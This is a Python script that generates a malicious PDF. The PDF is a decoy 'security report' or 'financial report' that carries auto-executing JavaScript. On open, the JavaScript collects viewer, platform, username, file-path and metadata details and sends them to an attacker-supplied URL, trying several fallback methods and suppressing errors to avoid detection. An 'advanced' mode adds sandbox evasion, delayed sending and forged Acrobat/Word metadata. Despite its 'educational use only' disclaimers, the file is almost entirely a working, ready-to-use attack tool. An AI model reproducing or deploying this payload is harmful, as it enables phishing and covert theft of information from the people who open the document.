#!/usr/bin/env python3
"""
Malicious PDF Generator for Security Research
Creates a PDF with embedded JavaScript that exfiltrates system information

EDUCATIONAL USE ONLY - For authorized security testing and research

Requirements:
    pip install reportlab pypdf2

Usage:
    python create_malicious_pdf.py --url http://your-server:8000/collect
"""

import argparse
from datetime import datetime
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
from PyPDF2 import PdfReader, PdfWriter
from io import BytesIO
import sys


def create_base_pdf():
    """Create a benign-looking PDF document"""
    buffer = BytesIO()
    c = canvas.Canvas(buffer, pagesize=letter)
    width, height = letter

    # Add content that looks legitimate
    c.setFont("Helvetica-Bold", 24)
    c.drawString(100, height - 100, "Security Research Document")

    c.setFont("Helvetica", 12)
    c.drawString(100, height - 150, "Annual Security Report 2024")
    c.drawString(100, height - 170, "Confidential - Internal Use Only")

    c.setFont("Helvetica", 10)
    y_position = height - 220

    content = [
        "",
        "Executive Summary",
        "",
        "This document contains important security information regarding our",
        "organizational infrastructure and compliance requirements.",
        "",
        "Please review the attached findings and recommendations carefully.",
        "",
        "Key Highlights:",
        "  • Network security assessment completed",
        "  • Vulnerability scan results included",
        "  • Compliance status updated",
        "  • Recommended actions outlined",
        "",
        "For questions, contact: security@company.com",
        "",
        "",
        "Note: This is an educational demonstration PDF created for",
        "computer security coursework. It contains JavaScript that collects",
        "system information when opened in a vulnerable PDF reader.",
    ]

    for line in content:
        c.drawString(100, y_position, line)
        y_position -= 15

    c.showPage()
    c.save()

    buffer.seek(0)
    return buffer


def create_javascript_payload(exfil_url):
    """
    Create JavaScript payload that collects system information
    and exfiltrates it to the specified URL
    """

    javascript_code = f"""
// Data collection function
function collectSystemInfo() {{
    // Collect available information from PDF reader environment
    var data = {{}};

    // Try to get reader information
    try {{
        data.reader = app.viewerType;
        data.viewer_version = app.viewerVersion;
        data.platform = app.platform;
        data.language = app.language;
    }} catch(e) {{
        data.reader_error = "Limited access";
    }}

    // Try to get user information
    try {{
        if (typeof identity !== 'undefined') {{
            data.username = identity.loginName;
            data.email = identity.name;
        }}
    }} catch(e) {{
        data.user_info = "Not available";
    }}

    // Document information
    try {{
        data.doc_title = this.info.Title;
        data.doc_author = this.info.Author;
        data.doc_subject = this.info.Subject;
        data.doc_creator = this.info.Creator;
        data.doc_producer = this.info.Producer;
        data.num_pages = this.numPages;
        data.doc_filename = this.documentFileName;
        data.doc_path = this.path;
    }} catch(e) {{
        data.doc_error = "Limited access";
    }}

    // Screen information
    try {{
        data.screen_width = screen.width;
        data.screen_height = screen.height;
        data.screen_depth = screen.pixelDepth;
    }} catch(e) {{
        data.screen_info = "Not available";
    }}

    // Timezone information
    try {{
        var d = new Date();
        data.timezone_offset = d.getTimezoneOffset();
        data.timestamp = d.toISOString();
    }} catch(e) {{
        data.time_info = "Not available";
    }}

    return data;
}}

// URL encoding function
function encodeData(data) {{
    var params = [];
    for (var key in data) {{
        if (data.hasOwnProperty(key)) {{
            params.push(encodeURIComponent(key) + "=" + encodeURIComponent(String(data[key])));
        }}
    }}
    return params.join("&");
}}

// Main exfiltration function
function exfiltrateData() {{
    try {{
        // Collect information
        var info = collectSystemInfo();

        // Build exfiltration URL
        var baseUrl = "{exfil_url}";
        var params = encodeData(info);
        var fullUrl = baseUrl + "?" + params;

        // Method 1: Try launchURL (most common method)
        try {{
            app.launchURL(fullUrl, true);  // true = silent mode
        }} catch(e) {{
            // If launchURL fails, try alternative
            try {{
                // Method 2: Try getURL
                if (typeof getURL !== 'undefined') {{
                    getURL(fullUrl);
                }}
            }} catch(e2) {{
                // Method 3: Try submitForm
                try {{
                    var url = baseUrl.replace("/collect", "/submit");
                    this.submitForm({{
                        cURL: url,
                        cSubmitAs: "HTML",
                        cCharset: "utf-8"
                    }});
                }} catch(e3) {{
                    // All methods failed - silent failure
                }}
            }}
        }}

    }} catch(e) {{
        // Silent failure to avoid detection
    }}
}}

// Execute immediately when PDF opens
exfiltrateData();

// Also try after a short delay (in case initial execution fails)
try {{
    app.setTimeOut("exfiltrateData();", 2000);  // 2 second delay
}} catch(e) {{
    // Timeout not available
}}
"""

    return javascript_code


def create_malicious_pdf(output_filename, exfil_url):
    """
    Create PDF with embedded malicious JavaScript
    """

    print(f"[*] Creating malicious PDF: {output_filename}")
    print(f"[*] Exfiltration URL: {exfil_url}")

    # Step 1: Create base PDF
    print("[+] Creating base PDF document...")
    base_pdf_buffer = create_base_pdf()

    # Step 2: Read the base PDF
    reader = PdfReader(base_pdf_buffer)
    writer = PdfWriter()

    # Copy pages from reader to writer
    for page in reader.pages:
        writer.add_page(page)

    # Step 3: Create JavaScript payload
    print("[+] Creating JavaScript payload...")
    js_payload = create_javascript_payload(exfil_url)

    # Step 4: Add JavaScript to PDF
    print("[+] Embedding JavaScript in PDF...")

    # Add JavaScript that executes on document open
    writer.add_js(js_payload)

    # Set document to open in full screen (makes it look more legitimate)
    # and add open action
    writer.add_metadata({
        '/Title': 'Security Report 2024',
        '/Author': 'Security Team',
        '/Subject': 'Annual Security Assessment',
        '/Creator': 'Adobe Acrobat Pro DC',
        '/Producer': 'Adobe Acrobat Pro DC 23.001.20093'
    })

    # Step 5: Write the malicious PDF
    print("[+] Writing malicious PDF to disk...")
    with open(output_filename, 'wb') as output_file:
        writer.write(output_file)

    print(f"[+] Malicious PDF created successfully: {output_filename}")
    print(f"\n{'='*70}")
    print("PDF Information:")
    print(f"{'='*70}")
    print(f"Filename: {output_filename}")
    print(f"Exfiltration URL: {exfil_url}")
    print(f"Payload: JavaScript with multiple exfiltration methods")
    print(f"Trigger: Auto-execute on document open (OpenAction)")
    print(f"\nData collected:")
    print("  - PDF Reader version and type")
    print("  - Operating system platform")
    print("  - System language")
    print("  - Screen resolution")
    print("  - Timezone information")
    print("  - Document metadata")
    print("  - File path (if accessible)")
    print(f"\n{'='*70}")
    print("\nTesting Instructions:")
    print("1. Start your FastAPI collector server:")
    print("   python fastapi_collector.py")
    print("\n2. Open the PDF in a PDF reader with JavaScript enabled:")
    print("   - Adobe Acrobat Reader DC (older versions)")
    print("   - Foxit Reader (with JavaScript enabled)")
    print("\n3. Check the collector server for received data:")
    print("   http://localhost:8000/data")
    print(f"\n{'='*70}")
    print("\n⚠️  SECURITY WARNING:")
    print("This PDF is for educational purposes only!")
    print("Only use in controlled environments for authorized testing.")
    print(f"{'='*70}\n")


def create_advanced_pdf(output_filename, exfil_url):
    """
    Create more sophisticated PDF with stealth techniques
    """

    print(f"[*] Creating ADVANCED malicious PDF: {output_filename}")
    print(f"[*] Using stealth techniques...")

    base_pdf_buffer = create_base_pdf()
    reader = PdfReader(base_pdf_buffer)
    writer = PdfWriter()

    for page in reader.pages:
        writer.add_page(page)

    # More sophisticated payload with evasion techniques
    js_payload = f"""
// Stealth data exfiltration with anti-analysis
(function() {{
    // Check if we're in a sandbox/analysis environment
    var isSandbox = false;

    try {{
        // Some sandboxes have limited timing
        var start = new Date().getTime();
        for(var i = 0; i < 1000000; i++) {{}}
        var end = new Date().getTime();
        if((end - start) < 10) {{
            isSandbox = true;  // Too fast, probably sandbox
        }}
    }} catch(e) {{}}

    // Only proceed if not in obvious sandbox
    if(!isSandbox) {{
        var data = {{}};

        // Collect data with error handling
        try {{ data.v = app.viewerVersion; }} catch(e) {{}}
        try {{ data.p = app.platform; }} catch(e) {{}}
        try {{ data.l = app.language; }} catch(e) {{}}
        try {{ data.t = this.info.Title; }} catch(e) {{}}
        try {{ data.f = this.documentFileName; }} catch(e) {{}}
        try {{ data.path = this.path; }} catch(e) {{}}
        try {{ data.np = this.numPages; }} catch(e) {{}}

        // Build URL with short parameter names (less suspicious)
        var params = [];
        for(var k in data) {{
            if(data[k]) {{
                params.push(k + "=" + encodeURIComponent(String(data[k])));
            }}
        }}

        var url = "{exfil_url}?" + params.join("&");

        // Delayed exfiltration (avoid immediate network activity)
        try {{
            app.setTimeOut("try{{app.launchURL('" + url + "',true);}}catch(e){{}}", 3000);
        }} catch(e) {{
            // Fallback: immediate exfiltration
            try {{
                app.launchURL(url, true);
            }} catch(e2) {{}}
        }}
    }}
}})();
"""

    writer.add_js(js_payload)

    # Legitimate-looking metadata
    writer.add_metadata({
        '/Title': 'Q4_Financial_Report_2024',
        '/Author': 'John Martinez',
        '/Subject': 'Financial Analysis Q4',
        '/Creator': 'Microsoft Word',
        '/Producer': 'Adobe PDF Library 15.0',
        '/CreationDate': 'D:20241201120000',
        '/ModDate': 'D:20241203093000'
    })

    with open(output_filename, 'wb') as output_file:
        writer.write(output_file)

    print(f"[+] Advanced malicious PDF created: {output_filename}")
    print("[+] Features: Anti-sandbox, delayed execution, short params")


def main():
    parser = argparse.ArgumentParser(
        description='Create malicious PDF for security research (Educational use only)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic malicious PDF
  python create_malicious_pdf.py --url http://192.168.1.100:8000/collect

  # Advanced version with stealth techniques
  python create_malicious_pdf.py --url http://192.168.1.100:8000/collect --advanced

  # Custom output filename
  python create_malicious_pdf.py --url http://localhost:8000/collect -o my_malicious.pdf

Note: Replace the URL with your actual FastAPI collector endpoint
        """
    )

    parser.add_argument(
        '--url',
        required=True,
        help='URL endpoint to exfiltrate data to (e.g., http://your-server:8000/collect)'
    )

    parser.add_argument(
        '-o', '--output',
        default='malicious_document.pdf',
        help='Output filename (default: malicious_document.pdf)'
    )

    parser.add_argument(
        '--advanced',
        action='store_true',
        help='Create advanced version with anti-analysis and stealth techniques'
    )

    args = parser.parse_args()

    # Validate URL
    if not (args.url.startswith('http://') or args.url.startswith('https://')):
        print("[!] Error: URL must start with http:// or https://")
        sys.exit(1)

    # Create the PDF
    try:
        if args.advanced:
            create_advanced_pdf(args.output, args.url)
        else:
            create_malicious_pdf(args.output, args.url)
    except Exception as e:
        print(f"[!] Error creating PDF: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
